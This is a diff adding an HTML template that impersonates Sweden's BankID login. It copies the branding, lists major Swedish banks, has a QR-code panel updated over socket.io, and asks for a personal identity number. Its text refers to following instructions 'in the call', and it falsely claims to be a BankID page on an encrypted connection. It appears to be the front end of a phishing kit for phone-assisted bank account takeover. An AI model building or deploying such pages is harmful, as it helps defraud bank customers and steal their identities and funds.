@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BankID</title>
+    <link rel="icon" href="{{ url_for('static', filename='img/logo-bank-id_32x32.ico') }}" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+
+</head>
+<body>
+    <div class="logo">
+        <img src="{{ url_for('static', filename='img/logo-bank-id.svg') }}" alt="Logo">
+    </div>
+
+    <div class="content-container">
+        <div id="mainTextContainer">Legitimering med BankID</div>
+        <div id="agreeSignText">
+            För att säkerställa din identitet använder vi BankID. Genom att logga in bekräftar du att det är du som utför åtgärden. <br>
+            Följ instruktionerna för en enkel och säker inloggning. <br>
+            Din säkerhet är vår prioritet.
+        </div>
+
+        <div class="card" id="qrCard" style="display: none;">
+            <div class="qr-container">
+                <div class="loader">
+                    <svg class='circular' viewbox='25 25 50 50'>
+                        <circle class='path' cx='50' cy='50' r='20' fill='none' stroke-width='4' stroke-miterlimit='10'></circle>
+                    </svg>
+                </div>
+                <div id="qrText">
+                    För att bekräfta din identitet, skanna QR-koden med din BankID. Följ instruktionerna i samtalet för att fortsätta. Denna metod är snabb, säker och används för att verifiera dig under hela processen.
+                    <img id="qrImage" alt="QR Code will appear here">
+                    <div id="bankid-qr-code" data-view-id="bankid-qr-code" class="current"></div>
+                    <div class="button-group">
+                        <div>
+                            <button class="link-button cancel-bankid">
+                                Avbryt
+                            </button>
+                        </div>
+                        <div>
+                            <button class="link-button sidebar-toggler" data-flow-info-target="other">
+                                <span class="help-button-text">
+                                    Behöver du hjälp?
+                                </span>
+                                <span class="help-button-text hidden">
+                                    Stäng
+                                </span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <button id="generateQrButton">Starta</button>
+    </div>
+
+    <div class="container" id="bankListContainer" style="display: none;">
+        <h3 style="text-align: start;color: black;">Välj din bank</h3>
+        <div class="search-container">
+            <span class="search-icon fas fa-search"></span>
+            <input type="text" id="searchInput" placeholder="Sök efter bank">
+        </div>
+        <ul class="bank-list" id="bankList">
+            <li>
+                <span class="bank-logo">
+                    <img src="static/img/banks/nordea.jpg" alt="Nordea Logo">
+                </span>
+                <div class="bank-name-container">
+                    <span class="bank-name">Nordea</span>
+                    <span class="arrow"></span>
+                </div>
+            </li>
+            <li>
+                <span class="bank-logo">
+                    <img src="static/img/banks/swedbank.png" alt="Swedbank & Sparbankerna Logo">
+                </span>
+                <div class="bank-name-container">
+                    <span class="bank-name">Swedbank & Sparbankerna</span>
+                    <span class="arrow"></span>
+                </div>
+            </li>
+            <li>
+                <span class="bank-logo">
+                    <img src="static/img/banks/handelsbanken.png" alt="Handelsbanken Logo">
+                </span>
+                <div class="bank-name-container">
+                    <span class="bank-name">Handelsbanken</span>
+                    <span class="arrow"></span>
+                </div>
+            </li>
+            <li>
+                <span class="bank-logo">
+                    <img src="static/img/banks/SEB.png" alt="SEB Logo">
+                </span>
+                <div class="bank-name-container">
+                    <span class="bank-name">SEB</span>
+                    <span class="arrow"></span>
+                </div>
+            </li>
+            <li>
+                <span class="bank-logo">
+                    <img src="static/img/banks/lansforsakringar.png" alt="Länsförsäkringar Logo">
+                </span>
+                <div class="bank-name-container">
+                    <span class="bank-name">Länsförsäkringar</span>
+                    <span class="arrow"></span>
+                </div>
+            </li>
+            <li>
+                <span class="bank-logo">
+                    <img src="static/img/banks/danske.jpg" alt="Danske Bank Logo">
+                </span>
+                <div class="bank-name-container">
+                    <span class="bank-name">Danske Bank</span>
+                    <span class="arrow"></span>
+                </div>
+            </li>
+            <li>
+                <span class="bank-logo">
+                    <img src="static/img/banks/skandiabanken.jpg" alt="Skandiabanken Logo">
+                </span>
+                <div class="bank-name-container">
+                    <span class="bank-name">Skandiabanken</span>
+                    <span class="arrow"></span>
+                </div>
+            </li>
+            <li>
+                <span class="bank-logo">
+                    <img src="static/img/banks/ica.jpg" alt="ICA Banken Logo">
+                </span>
+                <div class="bank-name-container">
+                    <span class="bank-name">ICA Banken</span>
+                    <span class="arrow"></span>
+                </div>
+            </li>
+            <li>
+                <span class="bank-logo">
+                    <img src="static/img/banks/sparbanken.png" alt="Sparbanken Syd Logo">
+                </span>
+                <div class="bank-name-container">
+                    <span class="bank-name">Sparbanken Syd</span>
+                    <span class="arrow"></span>
+                </div>
+            </li>
+        </ul>
+    </div>
+
+    <div class="waiting" id="waitingSection">
+        <div class="icon-container">
+            <div class="icon">
+                <div class="waiting-arrow"></div>
+            </div>
+            <div class="icon">
+                <div class="waiting-arrow"></div>
+            </div>
+            <div class="icon">
+                <div class="waiting-arrow"></div>
+            </div>
+        </div>
+        <h3>Vanligen vänta</h3>
+        <p>Vi behandlar din begäran.</p>
+    </div>
+
+    <div class="login-container" id="loginContainer">
+        <h2>Logga in på din bank</h2>
+        <p id="bank-name-from-bank-list"></p>
+        <form>
+            <div class="form-group">
+                <select id="login-method" name="login-method">
+                    <option value="mobile-bankid" >Mobilt bankID med QR kod</option>
+                </select>
+                <label for="login-method" class="floating-label">Inloggningsmetod</label>
+            </div>
+            <div class="form-group">
+                <input type="text" id="personal-number" name="personal-number" placeholder=" ">
+                <label for="personal-number" class="floating-label">Personnummer</label>
+            </div>
+            <button id="continue-button" type="submit">Gå vidare</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        <p>© BankID 2024<br>
+            Denna anslutning är krypterad</p>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/script.js') }}" defer></script>
+</body>
+</html>
